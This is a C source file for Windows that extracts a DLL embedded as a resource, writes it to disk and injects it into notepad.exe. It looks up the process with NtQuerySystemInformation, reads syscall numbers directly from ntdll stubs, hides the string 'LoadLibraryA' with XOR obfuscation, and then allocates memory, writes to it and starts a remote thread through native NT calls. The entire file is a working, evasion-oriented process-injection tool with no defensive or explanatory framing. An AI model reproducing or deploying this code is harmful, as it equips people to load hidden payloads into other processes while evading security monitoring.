#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>
#include <winnt.h>
#include "injection.h"
#define IDR_DLL2 102
#define key 0x5A

void ExtractEmbeddedDLL() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL2), RT_RCDATA);
    if (hRes == NULL) {
        printf("Failed to find DLL resource.\n");
        return;
    }

    DWORD dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) {
        printf("Failed to get size of DLL resource.\n");
        return;
    }

    HGLOBAL hGlobal = LoadResource(NULL, hRes);
    if (hGlobal == NULL) {
        printf("Failed to load DLL resource.\n");
        return;
    }

    void* pData = LockResource(hGlobal);
    if (pData == NULL) {
        printf("Failed to lock resource.\n");
        return;
    }

    FILE* file = NULL;
    errno_t err = fopen_s(&file, "extracted.dll", "wb");
    if (err != 0) {
        printf("Failed to create output file.\n");
        return;
    }

    fwrite(pData, 1, dwSize, file);
    fclose(file);
    printf("DLL extracted to 'extracted.dll'\n");
}

DWORD GetProcessIdNative(const wchar_t* targetProcessName) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    NtQuerySystemInformation_t NtQuerySystemInformation =
        (NtQuerySystemInformation_t)GetNtFunctionAddress("NtQuerySystemInformation", ntdll);
    if (!NtQuerySystemInformation) return 0;

    ULONG bufferSize = 0x10000; // 64 KB initial buffer
    PVOID buffer = NULL;
    NTSTATUS status;
    DWORD pid = 0;

    do {
        PVOID newBuffer = realloc(buffer, bufferSize);
        if (!newBuffer) {
            free(buffer);
            return 0;
        }
        buffer = newBuffer;
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        free(buffer);
        return 0;
    }

    ULONG offset = 0;
    while (TRUE) {
        PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)buffer + offset);

        if (spi->ImageName.Buffer) {
            if (_wcsicmp(spi->ImageName.Buffer, targetProcessName) == 0) {
                pid = (DWORD)(ULONG_PTR)spi->ProcessId;
                break;
            }
        }

        if (spi->NextEntryOffset == 0)
            break;
        offset += spi->NextEntryOffset;
    }

    free(buffer);
    return pid;
}

VOID GetSyscallNumber(_In_ HMODULE NtdllHandle, _In_ LPCSTR NtFunctionName, _Out_ PDWORD NtFunctionSSN) {
    UINT_PTR NtFunctionAddress = 0;
    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        PRINTXD("GetProcAddress", GetLastError());
        return;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0]; // points to the instruction byte, (syscall number)
    return;

}

char obfStr[] = {
    'L' ^ key, 'o' ^ key, 'a' ^ key, 'd' ^ key,
    'L' ^ key, 'i' ^ key, 'b' ^ key, 'r' ^ key,
    'a' ^ key, 'r' ^ key, 'y' ^ key, 'A' ^ key, 0
};

void deobfuscate(char* str, size_t len) {
    for (size_t i = 0; i < len; i++) {
        str[i] ^= key;
    }
}


FARPROC ResolveLoadLibraryA() {
    HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32Base)
        return NULL;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return NULL;

    LdrGetProcedureAddress_t LdrGetProcedureAddress =
        (LdrGetProcedureAddress_t)GetNtFunctionAddress("LdrGetProcedureAddress", ntdll);

    if (!LdrGetProcedureAddress)
        return NULL;

    deobfuscate(obfStr, sizeof(obfStr) - 1);
    ANSI_STRING funcName;
    funcName.Buffer = obfStr;
    funcName.Length = (USHORT)(sizeof(obfStr) - 1);
    funcName.MaximumLength = funcName.Length + 1;

    FARPROC funcAddr = NULL;
    if (!NT_SUCCESS(LdrGetProcedureAddress(kernel32Base, &funcName, 0, (PVOID*)&funcAddr)))
        return NULL;

    deobfuscate(obfStr, sizeof(obfStr) - 1);

    return funcAddr;
}


BOOL InjectDLL(const wchar_t* targetName) {
    DWORD PID = GetProcessIdNative(targetName);
    if (PID == 0) {
        printf("Failed to get PID of target process.\n");
        return FALSE;
    }

    // InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    SIZE_T dllPathSize = strlen("extracted.dll") + 1;
    LPVOID pRemoteMem = NULL;
    SIZE_T regionSize = dllPathSize;

    BOOL      State = TRUE;
    PVOID     Buffer = NULL;
    HANDLE    ThreadHandle = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten = 0;
    NTSTATUS  Status = 0;
    CLIENT_ID CID = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };
    //SIZE_T dllPathSize = strlen("extracted.dll") + 1;
    //LPVOID pRemoteMem = NULL;
    //SIZE_T regionSize = dllPathSize;
    SIZE_T bytesWritten = 0;
    FARPROC loadLibraryAddr = ResolveLoadLibraryA();

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        PRINTXD("GetModuleHandleW", GetLastError());
        return FALSE;
    }

    GetSyscallNumber(NtdllHandle, "NtOpenProcess", &h_NtOpenProcessSSN);
    GetSyscallNumber(NtdllHandle, "NtAllocateVirtualMemory", &h_NtAllocateVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtWriteVirtualMemory", &h_NtWriteVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtProtectVirtualMemory", &h_NtProtectVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtCreateThreadEx", &h_NtCreateThreadExSSN);
    GetSyscallNumber(NtdllHandle, "NtWaitForSingleObject", &h_NtWaitForSingleObjectSSN);
    GetSyscallNumber(NtdllHandle, "NtFreeVirtualMemory", &h_NtFreeVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtClose", &h_NtCloseSSN);

    Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtOpenProcess", Status);
        State = FALSE;
    }

    printf("c");

    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }

    char fullDllPath[MAX_PATH];
    if (GetFullPathNameA("extracted.dll", MAX_PATH, fullDllPath, NULL) == 0) {
        printf("Failed to get full DLL path. Error: %lu\n", GetLastError());
        NtFreeVirtualMemory(ProcessHandle, &Buffer, &regionSize, MEM_RELEASE);
        NtClose(ProcessHandle);
        return FALSE;
    }

    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, fullDllPath, strlen(fullDllPath) + 1, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }

    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &regionSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }

    if (!loadLibraryAddr) {
        printf("Failed to get LoadLibraryA address: %lu\n", GetLastError());
        NtFreeVirtualMemory(ProcessHandle, &Buffer, &regionSize, MEM_RELEASE);
        NtClose(ProcessHandle);
        return FALSE;
    }

    printf("d");

    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle,
        (LPTHREAD_START_ROUTINE)loadLibraryAddr, Buffer, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PRINTXD("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }

    printf("e");
    Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    printf("f");

    // NtClose(ThreadHandle);

CLEANUP:
    if (Buffer) {
        Status = NtFreeVirtualMemory(ProcessHandle, &Buffer, &regionSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PRINTXD("NtFreeVirtualMemory", Status);
        }
    }

    if (ThreadHandle) {
        NtClose(ThreadHandle);
    }

    if (ProcessHandle) {
        NtClose(ProcessHandle);
    }

    return State;
}



int main() {
    ExtractEmbeddedDLL();
    InjectDLL(L"notepad.exe");
    printf(" done");
    return 0;
}